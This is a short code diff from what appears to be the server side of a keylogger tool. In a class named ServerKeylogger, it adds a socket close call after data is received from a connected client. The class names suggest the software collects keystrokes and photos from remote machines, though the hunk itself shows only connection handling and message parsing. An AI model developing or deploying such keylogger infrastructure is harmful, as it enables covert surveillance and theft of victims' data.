@@ -91,6 +91,7 @@ class ServerKeylogger:
             bp.color(f"\nConnection has been established with {ipaddress}", "magenta")
 
             self.full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
+            server.close()
 
             if ")]" in self.full_msg:
                 if "***%§§)§§%" in self.full_msg:
